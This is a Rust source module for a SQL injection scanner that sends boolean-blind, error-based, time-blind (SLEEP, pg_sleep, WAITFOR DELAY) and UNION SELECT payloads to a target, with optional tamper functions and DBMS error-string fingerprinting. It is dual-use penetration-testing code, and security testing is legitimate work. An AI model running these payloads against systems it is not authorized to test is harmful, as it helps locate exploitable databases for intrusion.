//! SQL Injection detection techniques
//!
//! Implements detection for:
//! - Boolean-blind (response difference analysis)
//! - Error-based (error message pattern matching)
//! - Time-blind (response time analysis)
//! - UNION-based (column count detection)

#![allow(dead_code, unused_imports)]

use super::payloads::{Dbms, RiskLevel, SqliPayload, SqliTechnique};
use super::tamper::TamperFn;
use std::collections::HashMap;
use std::time::{Duration, Instant};

/// Result of a SQLi detection attempt
#[derive(Debug, Clone)]
pub struct DetectionResult {
    /// Whether injection was detected
    pub vulnerable: bool,
    /// Detected injection technique
    pub technique: Option<SqliTechnique>,
    /// Detected DBMS (if identifiable)
    pub dbms: Option<Dbms>,
    /// Payload that triggered detection
    pub payload: Option<String>,
    /// Confidence level (0.0 - 1.0)
    pub confidence: f32,
    /// Evidence supporting the detection
    pub evidence: Vec<String>,
    /// Parameter that was tested
    pub parameter: String,
    /// Injection point type
    pub injection_point: InjectionPoint,
}

impl DetectionResult {
    pub fn not_vulnerable(parameter: String, injection_point: InjectionPoint) -> Self {
        Self {
            vulnerable: false,
            technique: None,
            dbms: None,
            payload: None,
            confidence: 0.0,
            evidence: Vec::new(),
            parameter,
            injection_point,
        }
    }

    pub fn vulnerable(
        parameter: String,
        injection_point: InjectionPoint,
        technique: SqliTechnique,
        payload: String,
        confidence: f32,
    ) -> Self {
        Self {
            vulnerable: true,
            technique: Some(technique),
            dbms: None,
            payload: Some(payload),
            confidence,
            evidence: Vec::new(),
            parameter,
            injection_point,
        }
    }

    pub fn with_dbms(mut self, dbms: Dbms) -> Self {
        self.dbms = Some(dbms);
        self
    }

    pub fn with_evidence(mut self, evidence: impl Into<String>) -> Self {
        self.evidence.push(evidence.into());
        self
    }
}

/// Type of injection point
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionPoint {
    /// GET query parameter
    GetParam,
    /// POST form field
    PostParam,
    /// JSON body field
    JsonBody,
    /// Cookie value
    Cookie,
    /// HTTP header value
    Header,
    /// URL path segment
    PathSegment,
}

impl std::fmt::Display for InjectionPoint {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::GetParam => write!(f, "GET parameter"),
            Self::PostParam => write!(f, "POST parameter"),
            Self::JsonBody => write!(f, "JSON body"),
            Self::Cookie => write!(f, "Cookie"),
            Self::Header => write!(f, "Header"),
            Self::PathSegment => write!(f, "URL path"),
        }
    }
}

/// Error patterns for error-based detection
pub static ERROR_PATTERNS: &[(&str, Dbms)] = &[
    // MySQL errors
    ("you have an error in your sql syntax", Dbms::MySQL),
    ("warning: mysql", Dbms::MySQL),
    ("mysql_fetch", Dbms::MySQL),
    ("mysql_num_rows", Dbms::MySQL),
    ("mysql_query", Dbms::MySQL),
    ("supplied argument is not a valid mysql", Dbms::MySQL),
    ("mysqli_", Dbms::MySQL),
    // PostgreSQL errors
    ("pg_query", Dbms::PostgreSQL),
    ("pg_exec", Dbms::PostgreSQL),
    ("postgresql", Dbms::PostgreSQL),
    ("unterminated quoted string", Dbms::PostgreSQL),
    ("syntax error at or near", Dbms::PostgreSQL),
    ("pgsql", Dbms::PostgreSQL),
    // MSSQL errors
    ("microsoft sql server", Dbms::MsSQL),
    ("odbc sql server driver", Dbms::MsSQL),
    ("sqlserver", Dbms::MsSQL),
    ("unclosed quotation mark", Dbms::MsSQL),
    ("[microsoft][odbc", Dbms::MsSQL),
    ("mssql_query", Dbms::MsSQL),
    // Oracle errors
    ("ora-00933", Dbms::Oracle),
    ("ora-00921", Dbms::Oracle),
    ("ora-01756", Dbms::Oracle),
    ("quoted string not properly terminated", Dbms::Oracle),
    ("oracle", Dbms::Oracle),
    ("oci_", Dbms::Oracle),
    // SQLite errors
    ("sqlite_", Dbms::SQLite),
    ("sqlite3_", Dbms::SQLite),
    ("sqlite3::query", Dbms::SQLite),
    ("sqlite error", Dbms::SQLite),
    ("near \"", Dbms::SQLite),
    // Generic SQL errors
    ("sql syntax", Dbms::Generic),
    ("sql error", Dbms::Generic),
    ("syntax error", Dbms::Generic),
    ("invalid query", Dbms::Generic),
    ("unterminated string", Dbms::Generic),
    ("query failed", Dbms::Generic),
];

/// Configuration for SQLi detection
#[derive(Debug, Clone)]
pub struct DetectionConfig {
    /// Enable boolean-blind detection
    pub boolean_blind: bool,
    /// Enable error-based detection
    pub error_based: bool,
    /// Enable time-blind detection
    pub time_blind: bool,
    /// Enable UNION detection
    pub union_based: bool,
    /// Time threshold for time-blind detection (seconds)
    pub time_threshold: f32,
    /// Maximum risk level to test
    pub max_risk: RiskLevel,
    /// Tamper functions to apply
    pub tampers: Vec<TamperFn>,
    /// Target DBMS (None = test all)
    pub target_dbms: Option<Dbms>,
    /// Response similarity threshold for boolean detection (0.0 - 1.0)
    pub similarity_threshold: f32,
}

impl Default for DetectionConfig {
    fn default() -> Self {
        Self {
            boolean_blind: true,
            error_based: true,
            time_blind: true,
            union_based: true,
            time_threshold: 5.0,
            max_risk: RiskLevel::Medium,
            tampers: Vec::new(),
            target_dbms: None,
            similarity_threshold: 0.9,
        }
    }
}

impl DetectionConfig {
    pub fn quick() -> Self {
        Self {
            boolean_blind: true,
            error_based: true,
            time_blind: false, // Skip time-based (slow)
            union_based: false,
            ..Default::default()
        }
    }

    pub fn thorough() -> Self {
        Self {
            max_risk: RiskLevel::High,
            ..Default::default()
        }
    }

    pub fn with_tampers(mut self, tampers: Vec<TamperFn>) -> Self {
        self.tampers = tampers;
        self
    }

    pub fn for_dbms(mut self, dbms: Dbms) -> Self {
        self.target_dbms = Some(dbms);
        self
    }
}

/// HTTP response for analysis
#[derive(Debug, Clone)]
pub struct HttpResponse {
    /// HTTP status code
    pub status_code: u16,
    /// Response body
    pub body: String,
    /// Response time in milliseconds
    pub response_time_ms: u64,
    /// Response headers
    pub headers: HashMap<String, String>,
}

impl HttpResponse {
    pub fn new(status_code: u16, body: String, response_time_ms: u64) -> Self {
        Self {
            status_code,
            body,
            response_time_ms,
            headers: HashMap::new(),
        }
    }
}

/// Error-based detection
pub struct ErrorBasedDetector;

impl ErrorBasedDetector {
    /// Check if response contains SQL error patterns
    pub fn detect(response: &HttpResponse) -> Option<(Dbms, String)> {
        let body_lower = response.body.to_lowercase();

        for (pattern, dbms) in ERROR_PATTERNS {
            if body_lower.contains(pattern) {
                return Some((*dbms, pattern.to_string()));
            }
        }

        None
    }

    /// Test a parameter for error-based SQLi
    pub fn test<F>(
        original_value: &str,
        payloads: &[&SqliPayload],
        send_request: F,
    ) -> Option<DetectionResult>
    where
        F: Fn(&str) -> HttpResponse,
    {
        for payload in payloads
            .iter()
            .filter(|p| p.technique == SqliTechnique::ErrorBased)
        {
            let test_value = payload.apply(original_value);
            let response = send_request(&test_value);

            if let Some((dbms, pattern)) = Self::detect(&response) {
                return Some(
                    DetectionResult::vulnerable(
                        original_value.to_string(),
                        InjectionPoint::GetParam,
                        SqliTechnique::ErrorBased,
                        payload.payload.to_string(),
                        0.95,
                    )
                    .with_dbms(dbms)
                    .with_evidence(format!("Error pattern matched: '{}'", pattern)),
                );
            }
        }

        None
    }
}

/// Boolean-blind detection
pub struct BooleanBlindDetector;

impl BooleanBlindDetector {
    /// Calculate similarity between two response bodies
    pub fn response_similarity(body1: &str, body2: &str) -> f32 {
        if body1 == body2 {
            return 1.0;
        }

        if body1.is_empty() || body2.is_empty() {
            return 0.0;
        }

        // Simple word-based Jaccard similarity
        let words1: std::collections::HashSet<&str> = body1.split_whitespace().collect();
        let words2: std::collections::HashSet<&str> = body2.split_whitespace().collect();

        let intersection = words1.intersection(&words2).count() as f32;
        let union = words1.union(&words2).count() as f32;

        if union == 0.0 {
            0.0
        } else {
            intersection / union
        }
    }

    /// Detect boolean-blind SQLi by comparing true/false responses
    pub fn test<F>(
        original_value: &str,
        baseline_response: &HttpResponse,
        send_request: F,
        config: &DetectionConfig,
    ) -> Option<DetectionResult>
    where
        F: Fn(&str) -> HttpResponse,
    {
        // Test true condition
        let true_payload = format!("{}' AND '1'='1", original_value);
        let true_response = send_request(&true_payload);

        // Test false condition
        let false_payload = format!("{}' AND '1'='2", original_value);
        let false_response = send_request(&false_payload);

        // Compare responses
        let baseline_body_len = baseline_response.body.len();
        let true_body_len = true_response.body.len();
        let false_body_len = false_response.body.len();

        // Check if true condition matches baseline and false differs
        let true_similarity =
            Self::response_similarity(&baseline_response.body, &true_response.body);
        let false_similarity =
            Self::response_similarity(&baseline_response.body, &false_response.body);
        let true_false_similarity =
            Self::response_similarity(&true_response.body, &false_response.body);

        // Vulnerable if:
        // 1. True response is similar to baseline (> threshold)
        // 2. False response is different from baseline (< threshold)
        // 3. True and false responses are different
        let is_vulnerable = true_similarity > config.similarity_threshold
            && false_similarity < config.similarity_threshold
            && true_false_similarity < config.similarity_threshold;

        if is_vulnerable {
            let mut result = DetectionResult::vulnerable(
                original_value.to_string(),
                InjectionPoint::GetParam,
                SqliTechnique::BooleanBlind,
                true_payload.clone(),
                (true_similarity - false_similarity).abs(),
            );

            result.evidence.push(format!(
                "True condition similarity: {:.2}, False condition similarity: {:.2}",
                true_similarity, false_similarity
            ));
            result.evidence.push(format!(
                "Body lengths - Baseline: {}, True: {}, False: {}",
                baseline_body_len, true_body_len, false_body_len
            ));

            return Some(result);
        }

        // Also check status code differences
        if true_response.status_code == baseline_response.status_code
            && false_response.status_code != baseline_response.status_code
        {
            let mut result = DetectionResult::vulnerable(
                original_value.to_string(),
                InjectionPoint::GetParam,
                SqliTechnique::BooleanBlind,
                true_payload,
                0.8,
            );

            result.evidence.push(format!(
                "Status code difference - Baseline: {}, True: {}, False: {}",
                baseline_response.status_code,
                true_response.status_code,
                false_response.status_code
            ));

            return Some(result);
        }

        None
    }
}

/// Time-blind detection
pub struct TimeBlindDetector;

impl TimeBlindDetector {
    /// Test for time-based blind SQLi
    pub fn test<F>(
        original_value: &str,
        send_request: F,
        config: &DetectionConfig,
    ) -> Option<DetectionResult>
    where
        F: Fn(&str) -> HttpResponse,
    {
        // Get baseline response time
        let baseline_start = Instant::now();
        let _ = send_request(original_value);
        let baseline_time = baseline_start.elapsed();

        // Calculate threshold (baseline + expected delay)
        let threshold_ms =
            baseline_time.as_millis() as u64 + (config.time_threshold * 1000.0) as u64;

        // Test MySQL SLEEP
        let mysql_payload = format!(
            "{}' AND SLEEP({})--",
            original_value, config.time_threshold as u32
        );
        let mysql_response = send_request(&mysql_payload);

        if mysql_response.response_time_ms >= threshold_ms - 500 {
            let mut result = DetectionResult::vulnerable(
                original_value.to_string(),
                InjectionPoint::GetParam,
                SqliTechnique::TimeBlind,
                mysql_payload,
                0.9,
            )
            .with_dbms(Dbms::MySQL);

            result.evidence.push(format!(
                "Response time: {}ms (baseline: {}ms, expected delay: {}s)",
                mysql_response.response_time_ms,
                baseline_time.as_millis(),
                config.time_threshold
            ));

            return Some(result);
        }

        // Test PostgreSQL pg_sleep
        let pg_payload = format!(
            "{}'; SELECT pg_sleep({})--",
            original_value, config.time_threshold as u32
        );
        let pg_response = send_request(&pg_payload);

        if pg_response.response_time_ms >= threshold_ms - 500 {
            let mut result = DetectionResult::vulnerable(
                original_value.to_string(),
                InjectionPoint::GetParam,
                SqliTechnique::TimeBlind,
                pg_payload,
                0.9,
            )
            .with_dbms(Dbms::PostgreSQL);

            result.evidence.push(format!(
                "Response time: {}ms (expected delay: {}s)",
                pg_response.response_time_ms, config.time_threshold
            ));

            return Some(result);
        }

        // Test MSSQL WAITFOR DELAY
        let mssql_payload = format!(
            "{}'; WAITFOR DELAY '0:0:{}'--",
            original_value, config.time_threshold as u32
        );
        let mssql_response = send_request(&mssql_payload);

        if mssql_response.response_time_ms >= threshold_ms - 500 {
            let mut result = DetectionResult::vulnerable(
                original_value.to_string(),
                InjectionPoint::GetParam,
                SqliTechnique::TimeBlind,
                mssql_payload,
                0.9,
            )
            .with_dbms(Dbms::MsSQL);

            result.evidence.push(format!(
                "Response time: {}ms (expected delay: {}s)",
                mssql_response.response_time_ms, config.time_threshold
            ));

            return Some(result);
        }

        None
    }
}

/// UNION-based detection
pub struct UnionDetector;

impl UnionDetector {
    /// Detect number of columns using ORDER BY
    pub fn detect_columns<F>(original_value: &str, send_request: F) -> Option<usize>
    where
        F: Fn(&str) -> HttpResponse,
    {
        // Binary search for column count
        let mut low = 1;
        let mut high = 50;
        let mut last_valid = None;

        // Get baseline response for comparison
        let baseline = send_request(original_value);

        while low <= high {
            let mid = (low + high) / 2;
            let payload = format!("{} ORDER BY {}--", original_value, mid);
            let response = send_request(&payload);

            // Check if ORDER BY succeeded (no error)
            let has_error = ErrorBasedDetector::detect(&response).is_some()
                || response.status_code >= 400
                || response.body.len() < baseline.body.len() / 2;

            if has_error {
                high = mid - 1;
            } else {
                last_valid = Some(mid);
                low = mid + 1;
            }
        }

        last_valid
    }

    /// Test for UNION-based SQLi
    pub fn test<F>(original_value: &str, send_request: F) -> Option<DetectionResult>
    where
        F: Fn(&str) -> HttpResponse,
    {
        // First detect column count
        let columns = Self::detect_columns(original_value, &send_request)?;

        // Build UNION SELECT with identified column count
        let nulls: Vec<&str> = (0..columns).map(|_| "NULL").collect();
        let payload = format!("{}' UNION SELECT {}--", original_value, nulls.join(","));

        let response = send_request(&payload);

        // Check if UNION worked (no error, response changed)
        if ErrorBasedDetector::detect(&response).is_none() && response.status_code < 400 {
            let mut result = DetectionResult::vulnerable(
                original_value.to_string(),
                InjectionPoint::GetParam,
                SqliTechnique::Union,
                payload,
                0.85,
            );

            result
                .evidence
                .push(format!("Detected {} columns", columns));
            result
                .evidence
                .push("UNION SELECT with NULL values accepted".to_string());

            return Some(result);
        }

        None
    }
}

/// Combined SQLi detector
pub struct SqliDetector {
    config: DetectionConfig,
}

impl SqliDetector {
    pub fn new(config: DetectionConfig) -> Self {
        Self { config }
    }

    pub fn with_default_config() -> Self {
        Self::new(DetectionConfig::default())
    }

    /// Apply tamper functions to a payload
    fn apply_tampers(&self, payload: &str) -> String {
        self.config
            .tampers
            .iter()
            .fold(payload.to_string(), |acc, tamper| tamper(&acc))
    }

    /// Run all enabled detection techniques
    pub fn detect<F>(
        &self,
        parameter: &str,
        original_value: &str,
        injection_point: InjectionPoint,
        send_request: F,
    ) -> DetectionResult
    where
        F: Fn(&str) -> HttpResponse,
    {
        // Get baseline response
        let baseline = send_request(original_value);

        // Try error-based detection first (fastest)
        if self.config.error_based {
            // Test basic error triggers
            let error_payloads = ["'", "\"", "'\"", "\\", "' OR ''='"];

            for payload in error_payloads {
                let test_value = format!("{}{}", original_value, payload);
                let test_value = self.apply_tampers(&test_value);
                let response = send_request(&test_value);

                if let Some((dbms, pattern)) = ErrorBasedDetector::detect(&response) {
                    return DetectionResult::vulnerable(
                        parameter.to_string(),
                        injection_point,
                        SqliTechnique::ErrorBased,
                        payload.to_string(),
                        0.95,
                    )
                    .with_dbms(dbms)
                    .with_evidence(format!("Error pattern: '{}'", pattern));
                }
            }
        }

        // Try boolean-blind detection
        if self.config.boolean_blind {
            if let Some(result) = BooleanBlindDetector::test(
                original_value,
                &baseline,
                |v| send_request(&self.apply_tampers(v)),
                &self.config,
            ) {
                return result;
            }
        }

        // Try UNION-based detection
        if self.config.union_based {
            if let Some(result) =
                UnionDetector::test(original_value, |v| send_request(&self.apply_tampers(v)))
            {
                return result;
            }
        }

        // Try time-blind detection (slowest, do last)
        if self.config.time_blind {
            if let Some(result) = TimeBlindDetector::test(
                original_value,
                |v| send_request(&self.apply_tampers(v)),
                &self.config,
            ) {
                return result;
            }
        }

        DetectionResult::not_vulnerable(parameter.to_string(), injection_point)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_error_detection() {
        let response = HttpResponse::new(
            500,
            "You have an error in your SQL syntax near...".to_string(),
            100,
        );

        let result = ErrorBasedDetector::detect(&response);
        assert!(result.is_some());
        assert_eq!(result.unwrap().0, Dbms::MySQL);
    }

    #[test]
    fn test_no_error_detection() {
        let response = HttpResponse::new(200, "Normal page content".to_string(), 100);

        let result = ErrorBasedDetector::detect(&response);
        assert!(result.is_none());
    }

    #[test]
    fn test_response_similarity() {
        let body1 = "Hello world this is a test";
        let body2 = "Hello world this is a test";
        assert_eq!(BooleanBlindDetector::response_similarity(body1, body2), 1.0);

        let body3 = "Completely different content here";
        let similarity = BooleanBlindDetector::response_similarity(body1, body3);
        assert!(similarity < 0.5);
    }

    #[test]
    fn test_detection_config() {
        let config = DetectionConfig::quick();
        assert!(!config.time_blind);

        let config = DetectionConfig::thorough();
        assert_eq!(config.max_risk, RiskLevel::High);
    }
}
